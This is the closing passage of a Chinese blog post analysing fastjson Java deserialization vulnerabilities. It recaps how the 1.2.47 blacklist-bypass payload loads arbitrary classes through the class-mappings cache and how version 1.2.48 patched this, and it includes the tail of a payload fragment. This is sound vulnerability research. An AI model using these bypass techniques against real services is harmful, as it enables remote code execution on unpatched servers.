class="attr">"autoCommit"</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>审计结束完美。</p>
<blockquote>
<p>回顾一下进来的过程：</p>
<p>我们进入com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</p>
<ol>
<li>checkAutoType方法拿到Class.class</li>
<li>设置了ResolveStatus为TypeNameRedirect，决定了之后deserialze中的if走向</li>
<li>进入deserializer.deserialze</li>
</ol>
<p>com.alibaba.fastjson.serializer.MiscCodec#deserialze</p>
<ol>
<li>parser.resolveStatus为TypeNameRedirect，进入if为true走向</li>
<li>解析”val”:”恶意类名”，放入objVal，再传递到strVal</li>
<li>因为clazz=Class.class，进入TypeUtils.loadClass，传入strVal</li>
</ol>
<p>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader)</p>
<ol>
<li>添加默认cache为true，调用loadClass</li>
</ol>
<p>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader, boolean)</p>
<ol>
<li>三个改变mappings的第一处，由于classLoader=null，不进入</li>
<li>三个改变mappings的第二处，classLoader=null，进入；获取线程classLoader，由于cache为true，添加mappings。</li>
</ol>
</blockquote>
<h3 id="1-2-48修复"><a href="#1-2-48修复" class="headerlink" title="1.2.48修复"></a>1.2.48修复</h3><p>对比代码。修改了cache这一处。（右侧为1.2.47代码）</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1vmjmw2j32bc0lhacn.jpg" alt="1.2.48修复.png"></p>
<p>本来应该进入一个loadClass（两个参数）的方法，然后默认cache为true，在进入三个参数的loadClass。</p>
<p>现在这边直接指定过来三个参数loadClass同时cache为false。</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1v926igj31ok0b20ub.jpg" alt="1.2.48try.png"></p>
<p>可见，在同样payload执行时，我们原来说会改变mappings的第二处就因为cache而无法改变。</p>
<p>但是我们还记得之前分析时有第三处不需要校验cache的mappings赋值！精神一振，这就是0day的气息么！</p>
<p>然后…….</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gae1utn1i5j327q0n2mzu.jpg" alt="1.2.48修复2.png"></p>
<p>这就是程序员的力量么，两行代码秒杀一切，爱了爱了，0day再见。</p>
<h3 id="1-2-48以后"><a href="#1-2-48以后" class="headerlink" title="1.2.48以后"></a>1.2.48以后</h3><p>在这个通杀payload之后，就又恢复了一片平静的，在服务端手动配置关闭白名单情况下的黑名单与绕过黑名单的战争。这个战争估计随着代码不断迭代，也是不会停止的。</p>
<p>之后又出了一个影响广泛的拒绝服务漏洞，在1.2.60版本被修复。</p>
<p>当然这与反序列化就无关了，同时这篇文章也写得太久，太长了。也算是给2019做个结尾吧。</p>
<p>所以，</p>
<p>2020年，新年快乐。</p>
<p>要不 下场雪吧？</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">l1nk3r大佬</a></p>
<p><a href="https://www.kingkk.com/2019/07/Fastjson反序列化漏洞-1-2-24-1-2-48/" target="_blank" rel="noopener">https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/</a></p>
<p><a href="https://p0sec.net/index.php/archives/123/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/123/</a></p>
<p><a href="https://b1ue.cn/archives/184.html" target="_blank" rel="noopener">https://b1ue.cn/archives/184.html</a></p>
<p><a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">https://github.com/LeadroyaL/fastjson-blacklist</a></p>
<p><a href="https://p0rz9.github.io/2019/06/02/Fatsjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%90%8E%E7%BB%AD/" target="_blank" rel="noopener">https://p0rz9.github.io/2019/06/02/Fatsjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%90%8E%E7%BB%AD/</a></p>
<p><a href="https://github.com/vulhub/vulhub/tree/master/fastjson" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/fastjson</a></p>
<p><a href="http://wp.blkstone.me/2018/10/fastjson-serial-1/" target="_blank" rel="noopener">http://wp.blkstone.me/2018/10/fastjson-serial-1/</a></p>
<p><a href="https://blog.csdn.net/kingmax54212008/article/details/95641681" target="_blank" rel="noopener">https://blog.csdn.net/kingmax54212008/article/details/95641681</a></p>
<p><a href="https://github.com/alibaba/fastjson/tree/1.2.47" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/tree/1.2.47</a></p>
<p><a href="https://www.freebuf.com/vuls/208339.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/208339.html</a></p>
<p><a href="https://www.freebuf.com/column/180711.html" target="_blank" rel="noopener">https://www.freebuf.com/column/180711.html</a></p>
<p><a href="https://github.com/jas502n/fastjson-RCE" target="_blank" rel="noopener">https://github.com/jas502n/fastjson-RCE</a></p>
<p>可能还看了很多。。但是真的回头找不到了，向网上老哥们致敬 (^^ゞ</p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/friends/">友链</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson组件"><span class="toc-number">2.</span> <span class="toc-text">fastjson组件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson组件使用"><span class="toc-number">2.1.</span> <span class="toc-text">fastjson组件使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#type"><span class="toc-number">2.2.</span> <span class="toc-text">@type</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#【-lt-1-2-24】JNDI注入利用链——com-sun-rowset-JdbcRowSetImpl"><span class="toc-number">3.</span> <span class="toc-text">【&lt;=1.2.24】JNDI注入利用链——com.sun.rowset.JdbcRowSetImpl</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用条件"><span class="toc-number">3.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用链"><span class="toc-number">3.2.</span> <span class="toc-text">利用链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#【-lt-1-2-24】JDK1-7-的TemplatesImpl利用链"><span class="toc-number">4.</span> <span class="toc-text">【&lt;=1.2.24】JDK1.7 的TemplatesImpl利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用条件-1"><span class="toc-number">4.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tfactory为空的说明"><span class="toc-number">4.2.</span> <span class="toc-text">_tfactory为空的说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bytecodes需要base64编码"><span class="toc-number">4.3.</span> <span class="toc-text">_bytecodes需要base64编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getOutputProperties字段-gt-getOutputProperties方法"><span class="toc-number">4.4.</span> <span class="toc-text">_getOutputProperties字段 =&gt; getOutputProperties方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fastjson抗争的一生"><span class="toc-number">5.</span> <span class="toc-text">Fastjson抗争的一生</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-24漏洞版本修复"><span class="toc-number">5.1.</span> <span class="toc-text">1.2.24漏洞版本修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-25-1-2-41绕过"><span class="toc-number">5.2.</span> <span class="toc-text">1.2.25-1.2.41绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-42版本修复"><span class="toc-number">5.3.</span> <span class="toc-text">1.2.42版本修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-42绕过"><span class="toc-number">5.4.</span> <span class="toc-text">1.2.42绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-43版本修复"><span class="toc-number">5.5.</span> <span class="toc-text">1.2.43版本修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-44-限制"><span class="toc-number">5.6.</span> <span class="toc-text">1.2.44 [ 限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-45-黑名单添加"><span class="toc-number">5.7.</span> <span class="toc-text">1.2.45 黑名单添加</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-47-通杀payload！"><span class="toc-number">5.8.</span> <span class="toc-text">1.2.47 通杀payload！</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#deserializers-findClass-typeName"><span class="toc-number">5.8.1.</span> <span class="toc-text">deserializers.findClass(typeName)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TypeUtils-getClassFromMapping-typeName"><span class="toc-number">5.8.2.</span> <span class="toc-text">TypeUtils.getClassFromMapping(typeName)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#定向砸payload"><span class="toc-number">5.8.3.</span> <span class="toc-text">定向砸payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-48修复"><span class="toc-number">5.9.</span> <span class="toc-text">1.2.48修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-48以后"><span class="toc-number">5.10.</span> <span class="toc-text">1.2.48以后</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://lalajun.com/2019/12/30/java反序列化-fastjson/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://lalajun.com/2019/12/30/java反序列化-fastjson/&text=java反序列化-fastjson"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://lalajun.com/2019/12/30/java反序列化-fastjson/&title=java反序列化-fastjson"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lalajun.com/2019/12/30/java反序列化-fastjson/&is_video=false&description=java反序列化-fastjson"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=java反序列化-fastjson&body=Check out this article: http://lalajun.com/2019/12/30/java反序列化-fastjson/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://lalajun.com/2019/12/30/java反序列化-fastjson/&title=java反序列化-fastjson"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://lalajun.com/2019/12/30/java反序列化-fastjson/&title=java反序列化-fastjson"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://lalajun.com/2019/12/30/java反序列化-fastjson/&title=java反序列化-fastjson"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://lalajun.com/2019/12/30/java反序列化-fastjson/&title=java反序列化-fastjson"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://lalajun.com/2019/12/30/java反序列化-fastjson/&name=java反序列化-fastjson&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 LaLa
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/search/">搜索</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/friends/">友链</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

    <!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<!-- clipboard -->

  <script src="/lib/clipboard/clipboard.min.js"></script>
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight .code pre").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      target: function(trigger) {
        return trigger.nextElementSibling;
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功!");
      e.clearSelection();
    })
  })
  </script>

<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'lalajun';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":30,"vOffset":-70},"mobile":{"show":false},"log":false});</script></body>
</html>
